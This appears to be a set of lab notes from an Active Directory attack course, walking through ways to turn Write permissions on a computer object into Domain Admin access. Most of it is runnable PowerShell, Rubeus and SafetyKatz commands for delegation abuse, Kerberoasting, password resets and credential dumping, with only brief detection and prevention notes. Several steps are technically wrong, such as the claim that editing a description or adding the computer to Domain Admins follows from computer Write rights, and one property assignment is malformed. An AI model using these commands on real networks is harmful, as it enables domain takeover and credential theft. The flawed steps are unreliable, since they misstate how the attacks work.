# Learning Objective 17

**Date:** 15 August 2026

---

## Objective Overview

1. Find computer objects where attacker has Write permissions
2. Abuse Write permissions to escalate to Domain Admin
3. Access computer as Domain Admin via multiple methods

---

## Prerequisites

- **Domain user access**
- **PowerView or ActiveDirectory Module**
- **Identified target computer**
- **Write/GenericWrite/GenericAll permissions on computer**
- **Rubeus.exe** (for some attacks)

---

## Step 1: Find Computer Objects with Write Permissions

**Using PowerView to find computers we can write to:**

```powershell
Find-InterestingDomainACL | ?{$_.IdentityReferenceName -match "$(whoami)"}
```

Lists all objects where current user has interesting permissions.

---

**Filter for computers specifically:**

```powershell
Find-InterestingDomainACL | 
  ?{$_.IdentityReferenceName -match "$(whoami)" -and $_.ObjectType -eq "Computer"}
```

Shows only computer objects.

---

**Using ActiveDirectory Module:**

```powershell
Get-ADComputer -Filter * -Properties nTSecurityDescriptor | 
  ForEach-Object {
    $comp = $_
    $acl = $comp.nTSecurityDescriptor
    $acl.Access | Where-Object {$_.IdentityReference -match "$(whoami)"} | 
      ForEach-Object {$comp.Name; $_}
  }
```

More complex but shows ACL details.

---

**Example output:**

```
ObjectName: dcorp-mgmt
ObjectType: Computer
IdentityReferenceName: student1
AceType: Allow
Permissions: GenericWrite, WriteProperty, WriteOwner
```

We have GenericWrite on dcorp-mgmt computer.

---

## Step 2: Method 1 - RBCD Abuse (Already Covered)

**Configure RBCD on computer to impersonate DA:**

```powershell
# Create or use existing machine account
$machine = Get-ADComputer -Identity dcorp-student1$

# Configure RBCD on target computer
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $machine

# Extract machine key
SafetyKatz.exe '"sekurlsa::ekeys"'

# Use S4U to impersonate Administrator
Rubeus.exe s4u 
  /user:dcorp-student1$ 
  /aes256:<extracted_key> 
  /msdsspn:http/dcorp-mgmt 
  /impersonateuser:administrator 
  /ptt

# Access computer as DA
winrs -r:dcorp-mgmt cmd.exe
```

Result: Remote access as Administrator.

---

## Step 3: Method 2 - Set Service Principal Name (SPN)

**Add SPN to computer (enables Kerberoasting):**

```powershell
Set-ADComputer -Identity dcorp-mgmt -ServicePrincipalNames @{Add="http/dcorp-mgmt"}
```

Now dcorp-mgmt has HTTP SPN.

---

**Request Kerberos TGS for the service:**

```powershell
Rubeus.exe kerberoast /user:dcorp-mgmt$ /simple
```

Extract TGS for dcorp-mgmt computer account.

---

**Crack machine account password (if weak):**

```powershell
john.exe --wordlist=wordlist.txt hashes.txt
```

Machine account passwords are usually 128+ characters (strong), but worth trying.

---

## Step 4: Method 3 - Modify Computer Properties

**Change computer description or other properties to add DA:**

```powershell
Set-ADComputer -Identity dcorp-mgmt -Description "Compromised - DA Access"
```

Minimal privilege escalation, but confirms Write access.

---

## Step 5: Method 4 - Add Computer to Privileged Groups

**Add computer to group with DA privileges:**

```powershell
# If we have Write on computer and group membership
Add-ADGroupMember -Identity "Domain Admins" -Members dcorp-mgmt$
```

Less common, but possible if Write includes group membership.

---

## Step 6: Method 5 - Reset Computer Account Password

**Reset computer account password (if GenericWrite):**

```powershell
Set-ADAccountPassword -Identity dcorp-mgmt -NewPassword (ConvertTo-SecureString "NewP@ssw0rd123!" -AsPlainText -Force)
```

New password known, can use for authentication.

---

**Use new password for S4U:**

```powershell
Rubeus.exe asktgt 
  /user:dcorp-mgmt$ 
  /password:NewP@ssw0rd123! 
  /domain:dollarcorp.moneycorp.local 
  /ptt
```

Request TGT with modified password.

---

## Step 7: Method 6 - Modify Computer Delegation

**Set computer to have constrained delegation (if admin writes allowed):**

```powershell
Set-ADComputer -Identity dcorp-mgmt -TrustedToAuthForDelegation $true
```

Enable delegation on computer.

---

**Set allowed delegation targets:**

```powershell
$comp = Get-ADComputer -Identity dcorp-mgmt
$comp.msDS-AllowedToDelegateTo = "ldap/dcorp-dc.dollarcorp.moneycorp.local"
Set-ADComputer -Instance $comp
```

Now computer can delegate to LDAP on DC.

---

## Step 8: Method 7 - LDAP Query/Query as Domain Admin

**If computer has LDAP/directory admin (rare but possible):**

```powershell
# Computer account might have DA-like LDAP permissions
# Query as computer account to access sensitive data
Get-ADUser -Identity Administrator -Server dcorp-mgmt
```

Access directory resources via compromised computer.

---

## Complete Attack Workflow

```
1. Find computer with Write permissions
   (Find-InterestingDomainACL)
   ↓
2. Identify attack method based on permissions:
   - GenericWrite → RBCD abuse
   - WriteProperty → Modify delegation
   - WriteOwner → Change ownership
   - All → Full compromise
   ↓
3. Execute chosen attack:
   Option 1: RBCD + S4U → Remote access as DA
   Option 2: Add SPN + Kerberoast → Crack machine password
   Option 3: Reset password → Known credential
   Option 4: Modify delegation → Lateral escalation
   Option 5: Add to group → Privilege escalation
   ↓
4. Access computer as Domain Admin
   ↓
5. Extract credentials/hashes from computer
   ↓
6. Lateral movement or persistence
```

---

## Practical Example: Complete RBCD Abuse

**Given: Write permission on dcorp-mgmt**

```powershell
# 1. Check current permissions
Find-InterestingDomainACL | ?{$_.ObjectName -match "dcorp-mgmt"}
# Output: GenericWrite on dcorp-mgmt by student1

# 2. Check if we have machine account
Get-ADComputer -Identity dcorp-student1$
# Output: dcorp-student1$ exists

# 3. Configure RBCD
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount "dcorp-student1$"

# 4. Extract keys from student machine
$keys = SafetyKatz.exe '"sekurlsa::ekeys"'
# Extract: d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2

# 5. S4U exploitation
Rubeus.exe s4u 
  /user:dcorp-student1$ 
  /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 
  /msdsspn:http/dcorp-mgmt 
  /impersonateuser:administrator 
  /ptt

# 6. Verify ticket loaded
klist

# 7. Remote access as Administrator
winrs -r:dcorp-mgmt cmd.exe

# 8. Inside remote shell as DA
whoami
# Output: DOLLARCORP\Administrator

# 9. Extract credentials
SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
```

---

## Permissions & Capabilities Mapping

| Permission | Capability |
|---|---|
| GenericWrite | Modify all properties, RBCD abuse, delegation changes |
| WriteProperty | Modify specific properties, delegation targets |
| WriteDACL | Modify ACLs (grant self admin) |
| WriteOwner | Change object owner |
| ResetPassword | Set password (password spray protection bypass) |
| CreateChild | Create child objects |
| DeleteChild | Delete child objects |
| GenericAll | All permissions (full control) |

---

## Detection

**What logs:**
- Computer account creation (4741)
- Account property modification (5136)
- Group membership changes (4728, 4729, 4732, 4733)
- Password resets (4724)
- Delegation changes (5136)

**What doesn't log:**
- ACL enumeration (local operation)
- Write permission discovery (read-only)
- RBCD configuration (if not monitored)

---

## Prevention

- **Audit computer ACLs** — regularly check Write permissions
- **Restrict Write permissions** — limit who can modify computers
- **Disable machine quota** — prevent computer account creation
- **Monitor RBCD changes** — alert on msDS-AllowedToActOnBehalfOfOtherIdentity modifications
- **Protect SYSTEM account** — limit local admin access
- **Implement PKI** — reduce reliance on password-based auth
- **Monitor privileged operations** — S4U events, DCSync, etc.

---

## Real-World Scenarios

**Scenario 1: Resource Admin Escalation**
```
Attacker: Resource admin on file server
Permission: Write on dcorp-mgmt computer
Attack: Configure RBCD + S4U exploitation
Result: Remote access to dcorp-mgmt as DA
Impact: Access sensitive resources
```

**Scenario 2: Domain User Escalation**
```
Attacker: Domain user with Write on printer server
Permission: GenericWrite on dcorp-printer computer
Attack: Add SPN + Kerberoast machine account
Result: Machine account password (if weak)
Impact: Access printer server as SYSTEM
```

**Scenario 3: Lateral Movement**
```
Attacker: Compromised web server
Permission: Write on database server
Attack: Reset password → Use new password
Result: Access DB server
Impact: Database compromise
```

---

## Command Reference

| Task | Command |
|---|---|
| Find Write ACLs | `Find-InterestingDomainACL \| ?{$_.IdentityReferenceName -match "$(whoami)"}` |
| Filter computers | `Find-InterestingDomainACL \| ?{$_.ObjectType -eq "Computer"}` |
| Configure RBCD | `Set-ADComputer -Identity target -PrincipalsAllowedToDelegateToAccount $machine` |
| Add SPN | `Set-ADComputer -Identity target -ServicePrincipalNames @{Add="http/target"}` |
| Reset password | `Set-ADAccountPassword -Identity target -NewPassword $pass` |
| Enable delegation | `Set-ADComputer -Identity target -TrustedToAuthForDelegation $true` |
| Set delegation target | `Set-ADComputer -Identity target -ServicePrincipalNames @{Set="ldap/dc"}` |
| Extract keys | `SafetyKatz.exe '"sekurlsa::ekeys"'` |
| S4U exploitation | `Rubeus.exe s4u /user:machine$ /aes256:<key> /msdsspn:http/target /impersonateuser:admin /ptt` |
| Remote access | `winrs -r:target cmd.exe` |

---

## Key Takeaway

```
Write Permissions on Computer = Multiple Escalation Paths
1. Find computer with Write permissions
2. Evaluate attack options:
   - RBCD abuse (most common)
   - SPN modification + Kerberoast
   - Password reset
   - Delegation settings
   - Group membership
3. Execute exploitation
4. Access computer as Domain Admin
5. Extract credentials or lateral move
6. Forest compromise possible
```

---

## References

- [Rubeus - S4U & RBCD](https://github.com/GhostPack/Rubeus)
- [RBCD (Harmj0y)](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [PowerView ACL Abuse](https://github.com/PowerShellMafia/PowerSploit)
- [SafetyKatz - Credential Extraction](https://github.com/GhostPack/SafetyKatz)
- [Active Directory Security (Microsoft)](https://docs.microsoft.com/en-us/windows/win32/adschema/)

---

*Next: Advanced Topics & Cleanup*
